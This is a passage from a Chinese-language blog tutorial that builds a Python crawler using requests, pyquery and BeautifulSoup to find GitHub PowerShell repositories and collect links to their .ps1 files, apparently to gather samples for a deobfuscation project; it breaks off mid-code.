class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_repos</span>(<span class=\"params\">url</span>):</span></span><br><span class=\"line\">    headers = &#123;  <span class=\"comment\"># 设置访问头，Host - 请求服务器域名， User-Agent - 设置用户代理为浏览器，避免反爬</span></span><br><span class=\"line\">        <span class=\"string\">&#x27;Host&#x27;</span> : <span class=\"string\">&#x27;github.com&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;User-Agent&#x27;</span> : <span class=\"string\">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36&#x27;</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    r = requests.get(url=url, headers=headers)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> r.status_code != <span class=\"number\">200</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;网页加载错误&#x27;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> []</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#开始解析标签</span></span><br><span class=\"line\">    doc = pq(r.text)</span><br><span class=\"line\">    repos = []</span><br><span class=\"line\">    items = doc(<span class=\"string\">&#x27;a&#x27;</span>).<span class=\"built_in\">filter</span>(<span class=\"string\">&#x27;.v-align-middle&#x27;</span>).items()  </span><br><span class=\"line\">    <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> items:</span><br><span class=\"line\">        repos.append(item.text())</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">return</span> repos</span><br><span class=\"line\">    </span><br><span class=\"line\">url = <span class=\"string\">&quot;https://github.com/search?l=PowerShell&amp;q=powershell&amp;type=Repositories&amp;p=1&quot;</span></span><br><span class=\"line\">repo_list = get_repos(url)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(repo_list)</span><br></pre></td></tr></table></figure>\n<p>结果如下：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[<span class=\"string\">&#x27;lazywinadmin/PowerShell&#x27;</span>, <span class=\"string\">&#x27;clymb3r/PowerShell&#x27;</span>, <span class=\"string\">&#x27;danielbohannon/Invoke-Obfuscation&#x27;</span>, <span class=\"string\">&#x27;RamblingCookieMonster/PowerShell&#x27;</span>, <span class=\"string\">&#x27;PowerShellMafia/PowerSploit&#x27;</span>, <span class=\"string\">&#x27;MicrosoftDocs/PowerShell-Docs&#x27;</span>, <span class=\"string\">&#x27;FuzzySecurity/PowerShell-Suite&#x27;</span>, <span class=\"string\">&#x27;dahlbyk/posh-git&#x27;</span>, <span class=\"string\">&#x27;janikvonrotz/awesome-powershell&#x27;</span>, <span class=\"string\">&#x27;dracula/powershell&#x27;</span>]</span><br></pre></td></tr></table></figure>\n<h2 id=\"代码解析\"><a class=\"markdownIt-Anchor\" href=\"#代码解析\">#</a> 代码解析：</h2>\n<p>使用 <code>requests</code>  获取 Github 响应</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\">r = requests.get(<span class=\"string\">&quot;https://github.com/search?l=PowerShell&amp;q=powershell&amp;type=Repositories&amp;p=1&quot;</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(r.text)  <span class=\"comment\"># 获取Github响应的html</span></span><br></pre></td></tr></table></figure>\n<div style=\"width:100%;margin:auto\"><img data-src=\"/deobfuscator-crawler/github-reponse.png\" class=\"\"></div>\n<p>分析返回的 html 文本，其中关于仓库的信息如下所示</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;f4 text-normal&quot;</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;v-align-middle&quot;</span> <span class=\"attr\">data-hydro-click</span>=<span class=\"string\">&quot;&#123;<span class=\"symbol\">&amp;quot;</span>event_type<span class=\"symbol\">&amp;quot;</span>:<span class=\"symbol\">&amp;quot;</span>search_result.click<span class=\"symbol\">&amp;quot;</span>,<span class=\"symbol\">&amp;quot;</span>payload<span class=\"symbol\">&amp;quot;</span>:&#123;<span class=\"symbol\">&amp;quot;</span>page_number<span class=\"symbol\">&amp;quot;</span>:1,<span class=\"symbol\">&amp;quot;</span>per_page<span class=\"symbol\">&amp;quot;</span>:10,<span class=\"symbol\">&amp;quot;</span>query<span class=\"symbol\">&amp;quot;</span>:<span class=\"symbol\">&amp;quot;</span>powershell<span class=\"symbol\">&amp;quot;</span>,<span class=\"symbol\">&amp;quot;</span>result_position<span class=\"symbol\">&amp;quot;</span>:2,<span class=\"symbol\">&amp;quot;</span>click_id<span class=\"symbol\">&amp;quot;</span>:9093330,<span class=\"symbol\">&amp;quot;</span>result<span class=\"symbol\">&amp;quot;</span>:&#123;<span class=\"symbol\">&amp;quot;</span>id<span class=\"symbol\">&amp;quot;</span>:9093330,<span class=\"symbol\">&amp;quot;</span>global_relay_id<span class=\"symbol\">&amp;quot;</span>:<span class=\"symbol\">&amp;quot;</span>MDEwOlJlcG9zaXRvcnk5MDkzMzMw<span class=\"symbol\">&amp;quot;</span>,<span class=\"symbol\">&amp;quot;</span>model_name<span class=\"symbol\">&amp;quot;</span>:<span class=\"symbol\">&amp;quot;</span>Repository<span class=\"symbol\">&amp;quot;</span>,<span class=\"symbol\">&amp;quot;</span>url<span class=\"symbol\">&amp;quot;</span>:<span class=\"symbol\">&amp;quot;</span>https://github.com/clymb3r/PowerShell<span class=\"symbol\">&amp;quot;</span>&#125;,<span class=\"symbol\">&amp;quot;</span>originating_url<span class=\"symbol\">&amp;quot;</span>:<span class=\"symbol\">&amp;quot;</span>https://github.com/search?l=PowerShell<span class=\"symbol\">&amp;amp;</span>q=powershell<span class=\"symbol\">&amp;amp;</span>type=Repositories<span class=\"symbol\">&amp;amp;</span>p=1<span class=\"symbol\">&amp;quot;</span>,<span class=\"symbol\">&amp;quot;</span>user_id<span class=\"symbol\">&amp;quot;</span>:24938068&#125;&#125;&quot;</span> <span class=\"attr\">data-hydro-click-hmac</span>=<span class=\"string\">&quot;309d4f59b977bc66a4a930b1805d5bbc5cd5d76519a9d1f421fb14f094e253c8&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;/clymb3r/PowerShell&quot;</span>&gt;</span>clymb3r/<span class=\"tag\">&lt;<span class=\"name\">em</span>&gt;</span>PowerShell<span class=\"tag\">&lt;/<span class=\"name\">em</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>所以只需获取类  <code>v-align-middle</code>  对应的文本值即可，此时就需要用到另一个第三方库  <code>pyquery</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> pyquery <span class=\"keyword\">import</span> PyQuery <span class=\"keyword\">as</span> pq </span><br><span class=\"line\"></span><br><span class=\"line\">r = requests.get(<span class=\"string\">&quot;https://github.com/search?l=PowerShell&amp;q=powershell&amp;type=Repositories&amp;p=1&quot;</span>)</span><br><span class=\"line\">doc = pq(r.text)  </span><br><span class=\"line\"><span class=\"comment\"># 找到所有标签为`a`, 类别为&#x27;v-align-middle&#x27;的项 类名前要加&#x27;.&#x27;</span></span><br><span class=\"line\">items = doc(<span class=\"string\">&#x27;a&#x27;</span>).<span class=\"built_in\">filter</span>(<span class=\"string\">&#x27;.v-align-middle&#x27;</span>).items()  </span><br><span class=\"line\"><span class=\"comment\"># items是一个生成器，通过 for 遍历</span></span><br><span class=\"line\">repos = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> items:</span><br><span class=\"line\">    repos.append(item.text())</span><br><span class=\"line\"><span class=\"built_in\">print</span>(repos)</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[<span class=\"string\">&#x27;adbertram/Random-PowerShell-Work&#x27;</span>, <span class=\"string\">&#x27;BornToBeRoot/PowerShell&#x27;</span>, <span class=\"string\">&#x27;specterops/at-ps&#x27;</span>, <span class=\"string\">&#x27;EmpireProject/Empire&#x27;</span>, <span class=\"string\">&#x27;nullbind/Powershellery&#x27;</span>, <span class=\"string\">&#x27;microsoftgraph/powershell-intune-samples&#x27;</span>, <span class=\"string\">&#x27;SublimeText/PowerShell&#x27;</span>, <span class=\"string\">&#x27;ZHacker13/ReverseTCPShell&#x27;</span>, <span class=\"string\">&#x27;MicrosoftDocs/windows-powershell-docs&#x27;</span>, <span class=\"string\">&#x27;MicksITBlogs/PowerShell&#x27;</span>]</span><br></pre></td></tr></table></figure>\n<p>成功拿到搜索页面的仓库名</p>\n<h1 id=\"在github仓库中遍历找到所有的powershell文件\"><a class=\"markdownIt-Anchor\" href=\"#在github仓库中遍历找到所有的powershell文件\">#</a> 在 Github 仓库中遍历，找到所有的 powershell 文件</h1>\n<h2 id=\"分析单个仓库的html文本信息\"><a class=\"markdownIt-Anchor\" href=\"#分析单个仓库的html文本信息\">#</a> 分析单个仓库的 html 文本信息</h2>\n<p>此时 url 设置为 “<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2RyYWN1bGEvcG93ZXJzaGVsbA==\">https://github.com/dracula/powershell</span>”，仓库目录如下所示</p>\n<div style=\"width:100%;margin:auto\"><img data-src=\"/deobfuscator-crawler/dracula-repo.png\" class=\"\"></div>\n<p>分析 html 文本，找到文件链接，如下所示</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">文件超链接</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;js-navigation-open link-gray-dark&quot;</span> <span class=\"attr\">title</span>=<span class=\"string\">&quot;INSTALL.md&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;/dracula/powershell/blob/master/INSTALL.md&quot;</span>&gt;</span>INSTALL.md<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">目录超链接</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">class</span>=<span class=\"string\">&quot;js-navigation-open link-gray-dark&quot;</span> <span class=\"attr\">title</span>=<span class=\"string\">&quot;theme&quot;</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;/dracula/powershell/tree/master/theme&quot;</span>&gt;</span>theme<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>文件和目录链接的区别来源于 Git 的四种 object， <code>tree</code>  |   <code>blob</code>  |  <code>commit</code>  |  <code>tag</code>   分别代表  <code>目录</code>  ｜ <code> 文件</code>  ｜  <code>提交信息</code>  ｜  <code>标签，commit别名</code></p>\n<h2 id=\"使用pyquery解析\"><a class=\"markdownIt-Anchor\" href=\"#使用pyquery解析\">#</a> 使用 pyquery 解析</h2>\n<p><strong>outer_html</strong>(<em>method=‘html’</em>)</p>\n<p>获得第一个选中元素的 html 表示</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;&gt;&gt; d = PyQuery(<span class=\"string\">&#x27;&lt;div&gt;&lt;span class=&quot;red&quot;&gt;toto&lt;/span&gt; rocks&lt;/div&gt;&#x27;</span>)</span><br><span class=\"line\">&gt;&gt;&gt; <span class=\"built_in\">print</span>(d(<span class=\"string\">&#x27;span&#x27;</span>).outer_html())</span><br><span class=\"line\">&lt;span class=<span class=\"string\">&quot;red&quot;</span>&gt;toto&lt;/span&gt;</span><br></pre></td></tr></table></figure>\n<p>代码如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> pyquery <span class=\"keyword\">import</span> PyQuery <span class=\"keyword\">as</span> pq</span><br><span class=\"line\"></span><br><span class=\"line\">base_url = <span class=\"string\">&quot;https://github.com&quot;</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">找到Github当前页面下的ps文件，并将目录返回</span></span><br><span class=\"line\"><span class=\"string\">@param path 相对路径 /dracula/powershell</span></span><br><span class=\"line\"><span class=\"string\">@return list list [psfile0, psfile1, ...] [dir0, dir1, ...]</span></span><br><span class=\"line\"><span class=\"string\">&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">find_ps</span>(<span class=\"params\">path</span>):</span></span><br><span class=\"line\">    headers = &#123;  </span><br><span class=\"line\">        <span class=\"string\">&#x27;Host&#x27;</span> : <span class=\"string\">&#x27;github.com&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;User-Agent&#x27;</span> : <span class=\"string\">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36&#x27;</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    full_url = base_url + path</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:  </span><br><span class=\"line\">        r = requests.get(full_url, headers=headers, timeout=(<span class=\"number\">7</span>, <span class=\"number\">10</span>))  </span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> [], []</span><br><span class=\"line\">    </span><br><span class=\"line\">    ps, dirs = [], []  <span class=\"comment\"># 检测到的.ps1文件 和 目录</span></span><br><span class=\"line\">    doc = pq(r.text)</span><br><span class=\"line\">    items = doc(<span class=\"string\">&#x27;a&#x27;</span>).<span class=\"built_in\">filter</span>(<span class=\"string\">&#x27;.js-navigation-open&#x27;</span>).items()</span><br><span class=\"line\">    <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> items:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;/tree/&quot;</span> <span class=\"keyword\">in</span> item.outer_html():  <span class=\"comment\"># 检查html中是否包含 &#x27;/tree/&#x27;，是则认定节点为目录信息</span></span><br><span class=\"line\">            dirs.append(item.text())</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"string\">&quot;.ps1&quot;</span> == item.text():</span><br><span class=\"line\">            ps.append(item.text())</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ps, dirs</span><br><span class=\"line\"></span><br><span class=\"line\">path = <span class=\"string\">&quot;/dracula/powershell&quot;</span></span><br><span class=\"line\">ps, dirs = find_ps(path)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ps, dirs)</span><br></pre></td></tr></table></figure>\n<p>结果如下：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[] [<span class=\"string\">&#x27;.github&#x27;</span>, <span class=\"string\">&#x27;dist&#x27;</span>, <span class=\"string\">&#x27;images&#x27;</span>, <span class=\"string\">&#x27;theme&#x27;</span>]</span><br></pre></td></tr></table></figure>\n<p>从上面结果可知，程序正确地返回了目录名。但由于一个仓库中有多个子目录，所以更希望程序能够返回  <code>href=&quot;/dracula/powershell/tree/master/theme&quot;</code>  中的链接地址。但是 pyquery 功能有限，只针对 html 中的标签做了解析，所以需要需要更强有力的工具  <code>BeautifulSoup</code></p>\n<h2 id=\"使用beautifulsoup解析\"><a class=\"markdownIt-Anchor\" href=\"#使用beautifulsoup解析\">#</a> 使用 BeautifulSoup 解析</h2>\n<p>文档： <span class=\"exturl\" data-url=\"aHR0cHM6Ly9iZWF1dGlmdWxzb3VwLnJlYWR0aGVkb2NzLmlvL3poX0NOL3Y0LjQuMC8=\">https://beautifulsoup.readthedocs.io/zh_CN/v4.4.0/</span></p>\n<p>部分文档内容粘贴如下：</p>\n<p>一段 html 文本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">html_doc = <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;body&gt;</span></span><br><span class=\"line\"><span class=\"string\">&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were</span></span><br><span class=\"line\"><span class=\"string\">&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,</span></span><br><span class=\"line\"><span class=\"string\">&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and</span></span><br><span class=\"line\"><span class=\"string\">&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;</span></span><br><span class=\"line\"><span class=\"string\">and they lived at the bottom of a well.&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n<p>使用 Beautiful Soup 找到所有 &lt;a&gt; 标签中的链接</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup</span><br><span class=\"line\"></span><br><span class=\"line\">soup = BeautifulSoup(html_doc, <span class=\"string\">&#x27;html.parser&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">for</span> link <span class=\"keyword\">in</span> soup.find_all(<span class=\"string\">&#x27;a&#x27;</span>):</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(link[<span class=\"string\">&#x27;href&#x27;</span>])</span><br></pre></td></tr></table></figure>\n<p>结果如下：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://example.com/elsie</span><br><span class=\"line\">http://example.com/lacie</span><br><span class=\"line\">http://example.com/tillie</span><br></pre></td></tr></table></figure>\n<p>搜索 ps 文件函数修改如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> bs4 <span class=\"keyword\">import</span> BeautifulSoup  <span class=\"comment\"># 添加BeautifulSoup 头文件</span></span><br><span class=\"line\"></span><br><span class=\"line\">base_url = <span class=\"string\">&quot;https://github.com&quot;</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">find_ps</span>(<span class=\"params\">path</span>):</span></span><br><span class=\"line\">    headers = &#123;  </span><br><span class=\"line\">        <span class=\"string\">&#x27;Host&#x27;</span> : <span class=\"string\">&#x27;github.com&#x27;</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;User-Agent&#x27;</span> : <span class=\"string\">&#x27;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36&#x27;</span>,</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    full_url = base_url + <span class=\"string\">&quot;/&quot;</span> + path</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:  </span><br><span class=\"line\">        r = requests.get(full_url, headers=headers, timeout=(<span class=\"number\">7</span>, <span class=\"number\">10</span>))  </span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> [], []</span><br><span class=\"line\">    </span><br><span class=\"line\">    ps, dirs = [], []  <span class=\"comment\"># 检测到的.ps1文件 和 目录</span></span><br><span class=\"line\">    soup = BeautifulSoup(r.text, <span class=\"string\">&#x27;html.parser&#x27;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> link <span class=\"keyword\">in</span> soup.find_all(<span class=\"string\">&quot;a&quot;</span>, class_=<span class=\"string\">&quot;js-navigation-open&quot;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">&quot;/tree&quot;</span> <span class=\"keyword\">in</span> link[<span class=\"string\">&#x27;href&#x27;</span>]:</span><br><span class=\"line\">            dirs.append(link[<span class=\"string\">&#x27;href&#x27;</span>])</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> <span class=\"string\">&quot;.ps1&quot;</span> == link[<span class=\"string\">&#x27;href&#x27;</span>][-<span class=\"number\">4</span>:]:</span><br><span class=\"line\">            ps.append(link[<span class=\"string\">&#x27;href&#x27;</span>])</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"keyword\">pass</span></span><br><span class=\"line\">          </span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(ps)):  <span class=\"comment\"># 删除链接中的&quot;/blob&quot;，方便后续的下载过程</span></span><br><span class=\"line\">        ps[i] = ps[i].replace(<span class=\"string\">&quot;/blob/&quot;</span>, <span class=\"string\">&quot;/&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ps, dirs</span><br><span class=\"line\"></span><br><span class=\"line\">path = <span class=\"string\">&quot;/dracula/powershell&quot;</span></span><br><span class=\"line\">ps, dirs = find_ps(path)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(ps, dirs)</span><br></pre></td></tr></table></figure>\n<p>结果如下：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[] [<span class=\"string\">&#x27;/dracula/powershell/tree/master/.github&#x27;</span>, <span class=\"string\">&#x27;/dracula/powershell/tree/master/dist&#x27;</span>, <span class=\"string\">&#x27;/dracula/powershell/tree/master/images&#x27;</span>, <span class=\"string\">&#x27;/dracula/powershell/tree/master/theme&#x27;</span>]</span><br></pre></td></tr></table></figure>\n<p>由于 python 递归过慢，所以采用伪队列的形式对 Github 的仓库目录进行遍历</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_ps_in_repo</span>(<span class=\"params\">path</span>):</span>  </span><br><span class=\"line\">    ps, dirs = [], [<span class=\"string\">&quot;/&quot;</span> + path]  <span class=\"comment\"># path - 仓库根目录链接 eg: dracula/powershell</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"built_in\">len</span>(dirs) != <span class=\"number\">0</span>:</span><br><span class=\"line\">        cur_ps, cur_dirs = find_ps(dirs[<span class=\"number\">0</span>])</span><br><span class=\"line\">        dirs.remove(dirs[<span class=\"number\">0</span>])  <span class=\"comment\"># 移除已访问过的目录链接</span></span><br><span class=\"line\">        dirs += cur_dirs</span><br><span class=\"line\">        ps += cur_ps</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ps</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(get_ps_in_repo(<span class=\"string\">&quot;/dracula/powershell&quot;</span>))</span><br></pre></td></tr></table></figure>\n<p>结果如下：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[<span class=\"string\">&#x27;/dracula/powershell/master/theme/dracula-prompt-configuration.ps1&#x27;</span>]</span><br></pre></td></tr></table></figure>\n<p>只有一个 ps1 文件，与仓库实际情况相同相同</p>\n<p>由于我们需要下载 100 个以上的脚本文件，所以需要遍历多个仓库</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">traverse_repos</span>(<span class=\"params\">ps_num</span>):</span></span><br><span class=\"line\">    page = <span class=\"number\">1</span></span><br><span class=\"line\">    ps = []</span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        search_url = <span class=\"string\">&#x27;https://github.com/search?l=PowerShell&amp;q=powershell&amp;type=Repositories&amp;p=&#x27;</span> + <span class=\"built_in\">str</span>(page)</span><br><span class=\"line\">        repos = get_repos(search_url)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> repo <span 